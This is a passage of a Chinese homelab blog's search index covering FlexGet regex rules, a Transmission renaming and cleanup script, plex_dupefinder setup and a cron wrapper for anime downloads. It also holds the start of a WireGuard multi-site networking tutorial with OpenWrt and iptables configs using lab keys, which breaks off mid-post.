'\\1#0#\\2#1##2#\\3#3#\\4#4#' - full: from: full replace: regexp: '\\[(ANi)] (.+?)( S(\\d+))? - .+ - (\\d+) \\[(1080|720)[Pp]?]\\[([^]]+)].+' format: '\\1#0#\\2#1#\\4#2#\\5#3#\\7#4#\\6' - full: from: full replace: regexp: '\\[.*(LoliHouse).*] .+ / (.+?)( S(\\d+))? - (\\d+)(?:v\\d+)? \\[.*?(1080|720)[pP].*(简).+' format: '\\1#0#\\2#1#\\4#2#\\5#3##4#\\6' - full: from: full replace: regexp: '\\[(桜都字幕组|MingY|Oborozuki)] .*? / (.*?)( [Ss](\\d+))? \\[(\\d+)]\\[(1080|720)[pP]?].*简繁.*内封.+' format: '\\1#0#\\2#1#\\4#2#\\5#3##4#\\6' - full: from: full replace: regexp: '\\[(SweetSub)[^]]*]\\[.+?]\\[(.+?)([Ss](\\d+))?]\\[(\\d+)].+?(1080|720)[pP].+?简.+' format: '\\1#0#\\2#1#\\4#2#\\5#3##4#\\6' - group: # 提取字幕组名称 from: full replace: regexp: '^(.+?)#0#(.+?)#1#(\\d*)#2#(\\d+)#3#(\\S*)#4#(\\S*)$' format: '\\1' - name: # 提取番剧名 from: full replace: regexp: '^(.+?)#0#(.+?)#1#(\\d*)#2#(\\d+)#3#(\\S*)#4#(\\S*)$' format: '\\2' - session: # 提取第几季 from: full replace: regexp: '^(.+?)#0#(.+?)#1#(\\d*)#2#(\\d+)#3#(\\S*)#4#(\\S*)$' format: 'S\\3' - session: # 格式化 S1 改成 S01 from: session replace: regexp: '^S(\\d)$' format: 'S0\\1' - session: # 如果为空，默认S01 from: session replace: regexp: '^S$' format: 'S01' - episode: # 提取第几集 from: full replace: regexp: '^(.+?)#0#(.+?)#1#(\\d*)#2#(\\d+)#3#(\\S*)#4#(\\S*)$' format: 'E\\4' - episode: # E1 改成 S01 from: episode replace: regexp: '^E(\\d)$' format: 'E0\\1' - source: # 来源，Baha 之类的 from: full replace: regexp: '^(.+?)#0#(.+?)#1#(\\d*)#2#(\\d+)#3#(\\S*)#4#(\\S*)$' format: '\\5' - resolution: # 分辨率 from: full replace: regexp: '^(.+?)#0#(.+?)#1#(\\d*)#2#(\\d+)#3#(\\S*)#4#(\\S*)$' format: '\\6' - subpath: # 可以用黑名单来拦截 from: full replace: regexp: '^(.+?)#0#(.+?)#1#(\\d*)#2#(\\d+)#3#(\\S*)#4#(\\S*)$' format: 'Group: \\1; Name: \\2; Session: S\\3' - subpath: from: subpath replace: regexp: '^Group: (.+); Name: (.*); Session: S$' format: 'Group: \\1; Name: \\2; Session: S1' - subpath: from: subpath replace: regexp: '^Group: (.+); Name: (.*); Session: S(\\d)$' format: 'Group: \\1; Name: \\2; Session: S0\\3' - subpath: from: subpath replace: regexp: '^Group: (.+); Name: (.*); Session: (.*)$' format: '\\1/\\2/\\3' regexp: reject: - ANi/Mononogatari/S01 # 黑名单，这样不会下载这个番，支持正则 accept: - .+\\/.+\\/S\\d+ from: subpath template: tr transmission: path: '{? save_root ?}/{{ subpath }}/' Plex 识别优化 和 自动清空旧种Plex 有一个bug，如果文件名为 [Nekomoe kissaten][Undead Girl Murder Farce][02][1080p][JPTC].mp4 是无法识别的，需要替换为 [Nekomoe kissaten] Undead Girl Murder Farce - 02 [1080p][JPTC].mp4，把名称和集数给分开。所以写一个简单的脚本来修改名称，也顺便清理旧种子。 flexget-auto.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import transmission_rpcimport sysimport timeimport reTRANS_CLIENT_CONF = { &quot;host&quot;: &quot;localhost&quot;, &quot;port&quot;: &quot;9091&quot;, &quot;username&quot;: &quot;username&quot;, &quot;password&quot;: &quot;password&quot;,}def Airota(client: transmission_rpc.Client, torrent: transmission_rpc.Torrent): r = re.compile(r'^(\\[Airota\\])\\[([^]]+)\\]\\[(\\d+)\\]') new_file_name = r.sub(r&quot;\\1 \\2 - \\3 &quot;, torrent.name, 1) if new_file_name == torrent.name: return ret = client.rename_torrent_path(torrent.id, torrent.name, new_file_name) print(f'Airota Rename: {torrent.name} -&gt; {new_file_name}: {ret}')def NekomoeKissaten(client: transmission_rpc.Client, torrent: transmission_rpc.Torrent): r = re.compile(r'^(\\[Nekomoe kissaten\\])\\[([^]]+)\\]\\[(\\d+)\\]') new_file_name = r.sub(r&quot;\\1 \\2 - \\3 &quot;, torrent.name, 1) if new_file_name == torrent.name: return ret = client.rename_torrent_path(torrent.id, torrent.name, new_file_name) print(f'NekomoeKissaten Rename: {torrent.name} -&gt; {new_file_name}: {ret}')def DeleteOldTorrent(client: transmission_rpc.Client, torrent: transmission_rpc.Torrent) -&gt; bool: if torrent.is_finished is False: return False if torrent.done_date.timestamp() + 3600 * 24 * 7 &gt; time.time(): return False ret = client.remove_torrent(torrent.id, delete_data=False) print(f'Delete: {torrent.name}: {ret}') return Truedef main(): try: trans_client = transmission_rpc.Client(**TRANS_CLIENT_CONF) except transmission_rpc.error.TransmissionAuthError as e: print(e) sys.exit() torrents = trans_client.get_torrents() for torrent in torrents: print(f'{torrent.hashString[-8:]}: {torrent.name} ({torrent.status})', 'in transmission.') if DeleteOldTorrent(trans_client, torrent): # 删除老种子 continue NekomoeKissaten(trans_client, torrent) Airota(trans_client, torrent)main() Plex 去重之后，会有部分剧集多次重复下载，这里使用 plex dupefinder 来去重。它是通过 文件名，音频编码格式，视频编码格式，分辨率来给资源算分，自动算出最高的进行保留。 无脑安装命令 12345git clone https://github.com/l3uddz/plex_dupefinder.gitcd plex_dupefinderpython -m venv venvsource venv/bin/activatepip install -r requirements.txt 再创建 plex_dupefinder.sh 作为启动入口 1234#! /bin/bashBASE_PATH=`dirname $0`source $BASE_PATH/venv/bin/activatepython $BASE_PATH/plex_dupefinder.py 由于我的播放器支持 hevc 编码和我喜欢mkv格式，所以微调了下config。一般用默认即可。FILENAME_SCORES 也能主动给一些喜欢的字幕组加分。config.json 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071{ &quot;AUDIO_CODEC_SCORES&quot;: { &quot;Unknown&quot;: 0, &quot;aac&quot;: 1000, &quot;ac3&quot;: 1000, &quot;dca&quot;: 2000, &quot;dca-ma&quot;: 4000, &quot;eac3&quot;: 1250, &quot;flac&quot;: 2500, &quot;mp2&quot;: 500, &quot;mp3&quot;: 1000, &quot;pcm&quot;: 2500, &quot;truehd&quot;: 4500, &quot;wmapro&quot;: 200 }, &quot;AUTO_DELETE&quot;: true, &quot;FIND_DUPLICATE_FILEPATHS_ONLY&quot;: false, &quot;FILENAME_SCORES&quot;: { &quot;*.avi&quot;: -1000, &quot;*.ts&quot;: -1000, &quot;*.vob&quot;: -5000, &quot;*.mp4&quot;: -500, &quot;*.mkv&quot;: 500, &quot;*1080p*BluRay*&quot;: 15000, &quot;*720p*BluRay*&quot;: 10000, &quot;*HDTV*&quot;: -1000, &quot;*PROPER*&quot;: 1500, &quot;*REPACK*&quot;: 1500, &quot;*Remux*&quot;: 20000, &quot;*WEB*CasStudio*&quot;: 5000, &quot;*WEB*KINGS*&quot;: 5000, &quot;*WEB*NTB*&quot;: 5000, &quot;*WEB*QOQ*&quot;: 5000, &quot;*WEB*SiGMA*&quot;: 5000, &quot;*WEB*TBS*&quot;: -1000, &quot;*WEB*TROLLHD*&quot;: 2500, &quot;*WEB*VISUM*&quot;: 5000, &quot;*dvd*&quot;: -1000 }, &quot;PLEX_LIBRARIES&quot;: [ &quot;Bangumi&quot; ], &quot;PLEX_SERVER&quot;: &quot;https://your.plex/&quot;, &quot;PLEX_TOKEN&quot;: &quot;&quot;, &quot;SCORE_FILESIZE&quot;: true, &quot;SKIP_LIST&quot;: [], &quot;VIDEO_CODEC_SCORES&quot;: { &quot;Unknown&quot;: 0, &quot;h264&quot;: 8000, &quot;h265&quot;: 10000, &quot;hevc&quot;: 10000, &quot;mpeg1video&quot;: 250, &quot;mpeg2video&quot;: 250, &quot;mpeg4&quot;: 500, &quot;msmpeg4&quot;: 100, &quot;msmpeg4v2&quot;: 100, &quot;msmpeg4v3&quot;: 100, &quot;vc1&quot;: 3000, &quot;vp9&quot;: 1000, &quot;wmv2&quot;: 250, &quot;wmv3&quot;: 250 }, &quot;VIDEO_RESOLUTION_SCORES&quot;: { &quot;1080&quot;: 10000, &quot;480&quot;: 3000, &quot;4k&quot;: 20000, &quot;720&quot;: 5000, &quot;Unknown&quot;: 0, &quot;sd&quot;: 1000 }} 统一启动 + 定时任务这里需要再 flexget 执行后，需要跑一些脚本，不用 flexget 的 schedule，用 crontab 触发 run.sh 1234567# ! /bin/bashfind /mnt/WEB-DL/ -type d -empty # 自动清空目录为空的文件夹source /flexget/bin/activatecd /config/flexget # 配置在这里flexget --cron executepython flexget-auto.py &gt; flexget-auto.log/plex_dupefinder/plex_dupefinder.sh &gt; plex_dupefinder.log 再加入 crontab 就搞定啦~ 1*/10 * * * * &quot;/flexget/run.sh&quot;","link":"/2023/07/flexget-plex-and-bangumi/"},{"title":"Wireguard 组网","text":"随着上一篇 WireGuard 简易上手，已经对 WireGuard 有了一定了解。接着我们可以通过 WireGuard 进行进阶的组网操作。 可以查看一下下面的网络图，简单来说我们可以通过WireGuard 使 NodeA，NodeB 互通，并且也能访问到 UbuntuC 中所在网段（单向） Master Master 192.168.234.128 100.64.0.1 OpenwrtA Openwrt A 192.168.123.11 100.64.0.2 100.64.1.1 OpenwrtB Openwrt B 192.168.123.12 100.64.0.3 100.64.1.1 UbuntuC Ubuntu C 192.168.31.10 100.64.0.4 NodeA Node A 100.64.1.10 NodeB Node B 100.64.2.10 VMnet0 Vmware NAT(INTERNET) 192.168.234.0/24 VMnet0-&gt;Master VMnet0-&gt;OpenwrtA VMnet0-&gt;OpenwrtB VMnet1 Vmware NAT1 100.64.1.0/24 VMnet1-&gt;OpenwrtA VMnet1-&gt;NodeA VMnet2 Vmware NAT2 100.64.2.0/24 VMnet2-&gt;OpenwrtB VMnet2-&gt;NodeB VMnet3 Vmware NAT3(DHCP) 192.168.31.0/24 VMnet3-&gt;UbuntuC WG WG NAT 100.64.0.0/24 WG-&gt;Master Server WG-&gt;OpenwrtA WG-&gt;OpenwrtB WG-&gt;UbuntuC 构建测试环境Master 和 Ubuntu 两台主机，可以按照之前教程进行配置。Openwrt 需要安装 wireguard-tools使用VMware 的虚拟网络进行组网 配置 Openwrt LAN分配给 Openwrt A/B 分别是 100.64.1.0/24, 100.64.2.0/24 需要通过修改 接口LAN 相关配置 配置 Wireguard生成相应密钥对 Master1234567891011121314151617181920[Interface]PrivateKey = ELjtwIswOI/qSV6oDkRbOdaZt+CuLWSWu3rY1Wh0XUU=Address = 100.64.0.1/24SaveConfig = truePostUp = iptables -A FORWARD -i %i -j ACCEPT; iptables -A FORWARD -o %i -j ACCEPT; iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE; ip6tables -A FORWARD -i %i -j ACCEPT; ip6tables -A FORWARD -o %i -j ACCEPT; ip6tables -t nat -A POSTROUTING -o ens33 -j MASQUERADEPostDown = iptables -D FORWARD -i %i -j ACCEPT; iptables -D FORWARD -o %i -j ACCEPT; iptables -t nat -D POSTROUTING -o ens33 -j MASQUERADE; ip6tables -D FORWARD -i %i -j ACCEPT; ip6tables -D FORWARD -o %i -j ACCEPT; ip6tables -t nat -D POSTROUTING -o ens33 -j MASQUERADEListenPort = 65535[Peer]PublicKey = YUMWodweSGW3S8kY45xOeCZHX0LwNUekDTs7fYM09T0=AllowedIPs = 100.64.0.2/32[Peer]PublicKey = Nn4Z/TSRHrbtp2z0YC09S88Lm0MBtiZeTlAhtZ4AJwI=AllowedIPs = 100.64.0.3/32[Peer]PublicKey = 2g83ZgKl56O/swhR6vHaiMg5TBiKhkN5R71qEsbpNhA=AllowedIPs = 100.64.0.4/32 Openwrt A在 /etc/config/network 最后添加配置 123456789101112config interface 'link_main' option proto 'wireguard' option private_key 'gNAl0GGk6zJr6IVJjaDAdJvgOAWRss2m3fLL6PCpl38=' list addresses '100.64.0.2/32'config wireguard_link_main 'main' option public_key '/8LTHNe886/h8IxhjMdbXJyYHlSQQAuIFXtZtRBdGH0=' option endpoint_host '192.168.234.128' option endpoint_port '65535' option persistent_keepalive '25' option route_allowed_ips '1' list allowed_ips '100.64.0.0/24' 重启网络 1/etc/init.d/network restart Openwrt B同上操作 123456789101112config interface 'link_main' option proto 'wireguard' option private_key '8PGe5bj8/1+t632qIVrXH4qqRH1tuKvvlTKCdymyWW8=' list addresses '100.64.0.3/32'config wireguard_link_main 'main' option public_key '/8LTHNe886/h8IxhjMdbXJyYHlSQQAuIFXtZtRBdGH0=' option endpoint_host '192.168.234.128' option endpoint_port '65535' option persistent_keepalive '25' option route_allowed_ips '1' list allowed_ips '100.64.0.0/24' 网络互通Openwrt 间","link":"/2023/01/wireguard-network-link/"}],"tags":[{"name":"DNS","slug":"DNS","link":"/tags/DNS/"},{"name":"Chromium","slug":"Chromium","link":"/tags/Chromium/"},{"name":"Hexo","slug":"Hexo","link":"/tags/Hexo/"},{"name":"WireGuard","slug":"WireGuard","link":"/tags/WireGuard/"},{"name":"tutorial","slug":"tutorial","link":"/tags/tutorial/"},{"name":"flexget","slug":"flexget","link":"/tags/flexget/"},{"name":"plex","slug":"plex","link":"/tags/plex/"},{"name":"bangumi","slug":"bangumi","link":"/tags/bangumi/"},{"name":"homelab","slug":"homelab","link":"/tags/homelab/"},{"name":"Network","slug":"Network","link":"/tags/Network/"}],"categories":[{"name":"CTF","slug":"CTF","link":"/categories/CTF/"},{"name":"破事水","slug":"破事水","link":"/categories/%E7%A0%B4%E4%BA%8B%E6%B0%B4/"},{"name":"尝尝鲜","slug":"尝尝鲜","link":"/categories/%E5%B0%9D%E5%B0%9D%E9%B2%9C/"}]}